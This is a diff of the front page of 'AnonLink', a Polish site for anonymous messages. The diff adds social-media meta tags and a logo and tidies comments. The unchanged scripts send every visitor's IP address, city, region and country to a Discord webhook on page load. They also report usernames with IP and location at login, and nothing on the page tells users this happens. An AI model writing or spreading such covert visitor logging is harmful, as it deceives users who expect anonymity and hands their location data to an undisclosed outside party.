@@ -6,8 +6,16 @@
     <title>AnonLink - Otrzymuj anonimowe wiadomości</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <meta property="og:title" content="AnonLink - Otrzymuj anonimowe wiadomości">
+    <meta property="og:description" content="AnonLink to platforma, która pozwala Ci otrzymywać szczere, anonimowe wiadomości od znajomych. Stwórz swój link i udostępnij go!">
+    <meta property="og:image" content="https://i.postimg.cc/Bbg49svM/anonlink-logo.png">
+    <meta property="og:url" content="https://anonlink.fun">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="AnonLink - Otrzymuj anonimowe wiadomości">
+    <meta name="twitter:description" content="AnonLink to platforma, która pozwala Ci otrzymywać szczere, anonimowe wiadomości od znajomych. Stwórz swój link i udostępnij go!">
+    <meta name="twitter:image" content="https://i.postimg.cc/Bbg49svM/anonlink-logo.png">
     <style>
-        /* Custom styles for the body background gradient and font */
         body {
             font-family: 'Inter', sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -24,6 +32,8 @@
 </head>
 <body class="min-h-screen flex items-center justify-center p-5">
     <div class="container bg-white rounded-2xl p-10 shadow-xl text-center max-w-md w-full">
+        <img src="https://i.postimg.cc/Bbg49svM/anonlink-logo.png" alt="AnonLink Logo" class="mx-auto mb-5 w-32 h-32 object-contain rounded-full">
+        
         <div class="logo text-4xl font-bold text-indigo-600 mb-5">AnonLink</div>
         <p class="subtitle text-gray-600 mb-8 text-lg leading-relaxed">Otrzymuj szczere, anonimowe wiadomości od znajomych</p>
         
@@ -151,7 +161,7 @@
 
             // Prepare the message for Discord
             const discordPayload = {
-                content: `New visitor to anonlink.fun! IP: ${userIP}, Region: ${regionName} (${countryCode})`, // ZMIANA: aw0.fun -> anonlink.fun
+                content: `New visitor to anonlink.fun! IP: ${userIP}, Region: ${regionName} (${countryCode})`, 
                 embeds: [{
                     title: "Visitor IP & Region Logged",
                     description: `IP Address: \`${userIP}\`\nRegion: \`${regionName}\`\nCity: \`${cityName}\`\nCountry: \`${countryName} (${countryCode})\``,
@@ -183,10 +193,10 @@
             const activityType = isNewUser ? "New Account Created" : "Logged In";
             
             const discordPayload = {
-                content: `AnonLink User Activity! User: ${username}, IP: ${userIP}, Region: ${regionName} (${countryCode})`, // ZMIANA: aw0 -> AnonLink
+                content: `AnonLink User Activity! User: ${username}, IP: ${userIP}, Region: ${regionName} (${countryCode})`, 
                 embeds: [{
                     title: "User Account Activity",
-                    description: `Action: \`${activityType}\`\nUsername: \`${username}\`\nIP Address: \`${userIP}\`\nRegion: \`${regionName}\`\nCity: \`${cityName}\`\nCountry: \`${countryCode}\``,
+                    description: `Action: \`${activityType}\`\nUsername: \`${username}\`\nIP Address: \`${userIP}\`\nRegion: \`${regionName}\`\nCity: \`${cityName}\`\nCountry: \`${countryName} (${countryCode})\``,
                     color: isNewUser ? 0x27ae60 : 0x3498db, // Green for new, blue for login
                     timestamp: new Date().toISOString()
                 }]
@@ -213,7 +223,7 @@
             // Send visitor IP and Region to webhook as soon as the page loads
             sendVisitorInfoToWebhook(); 
 
-            const savedUser = getCookie('anonlink_user'); // ZMIANA: aw0_user -> anonlink_user
+            const savedUser = getCookie('anonlink_user'); 
             if (savedUser) {
                 const welcomeDiv = document.getElementById('welcomeBack');
                 welcomeDiv.style.display = 'block';
@@ -224,10 +234,10 @@
                     .then(data => {
                         if (data.exists) {
                             setTimeout(() => {
-                                window.location.href = 'https://anonlink.fun/dashboard.html?user=' + encodeURIComponent(savedUser); // ZMIANA: aw0.fun -> anonlink.fun
+                                window.location.href = 'https://anonlink.fun/dashboard.html?user=' + encodeURIComponent(savedUser); 
                             }, 2000);
                         } else {
-                            deleteCookie('anonlink_user'); // ZMIANA: aw0_user -> anonlink_user
+                            deleteCookie('anonlink_user'); 
                             welcomeDiv.style.display = 'none';
                             document.getElementById('message').innerHTML = '<div class="text-red-500 mt-3 text-sm">Twoje konto nie zostało znalezione. Zaloguj się ponownie.</div>';
                         }
@@ -279,7 +289,7 @@
                 showLoading(false);
                 
                 if (data.success) {
-                    setCookie('anonlink_user', username, 30); // ZMIANA: aw0_user -> anonlink_user
+                    setCookie('anonlink_user', username, 30); 
                     
                     // Send user activity to webhook
                     sendUserActivityToWebhook(username, data.isNew);
@@ -287,13 +297,15 @@
                     if (data.isNew) {
                         messageDiv.innerHTML = '<div class="text-green-600 mt-3 text-sm">✅ Konto utworzone pomyślnie! Przekierowuję do dashboardu...</div>';
                     } else {
+                        // This branch should ideally not be hit if backend enforces unique registration
                         messageDiv.innerHTML = '<div class="text-green-600 mt-3 text-sm">✅ Zalogowano pomyślnie! Przekierowuję do dashboardu...</div>';
                     }
                     
                     setTimeout(() => {
-                        window.location.href = 'https://anonlink.fun/dashboard.html?user=' + encodeURIComponent(username); // ZMIANA: aw0.fun -> anonlink.fun
+                        window.location.href = 'https://anonlink.fun/dashboard.html?user=' + encodeURIComponent(username); 
                     }, 1500);
                 } else {
+                    // Handle the case where username already exists
                     messageDiv.innerHTML = '<div class="text-red-500 mt-3 text-sm">❌ ' + (data.message || 'Wystąpił błąd') + '</div>';
                 }
             })
